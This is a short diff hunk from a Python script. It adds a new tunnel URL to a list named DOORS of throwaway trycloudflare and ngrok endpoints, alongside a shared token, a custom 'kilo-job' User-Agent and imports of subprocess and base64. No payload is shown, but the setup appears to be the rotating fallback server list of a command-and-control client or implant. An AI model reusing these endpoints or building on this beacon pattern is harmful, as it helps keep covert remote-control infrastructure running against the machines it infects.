@@ -5,7 +5,13 @@
 import os, sys, json, time, base64, subprocess, urllib.request, hashlib
 
 TOK = "GOLD24"
-DOORS = [\n    "https://letting-media-noted-territories.trycloudflare.com",\n    "https://phantom-analytical-gains-curious.trycloudflare.com",\n    "https://definitely-screenshot-butler-temp.trycloudflare.com",\n    "https://fields-accomplish-growth-spin.trycloudflare.com",\n    "https://retrain-schnapps-upbeat.ngrok-free.dev",
+DOORS = [
+    "https://economic-names-available-frozen.trycloudflare.com",
+    "https://letting-media-noted-territories.trycloudflare.com",
+    "https://phantom-analytical-gains-curious.trycloudflare.com",
+    "https://definitely-screenshot-butler-temp.trycloudflare.com",
+    "https://fields-accomplish-growth-spin.trycloudflare.com",
+    "https://retrain-schnapps-upbeat.ngrok-free.dev",
 ]
 HDRS = {"User-Agent": "kilo-job", "ngrok-skip-browser-warning": "1"}
 
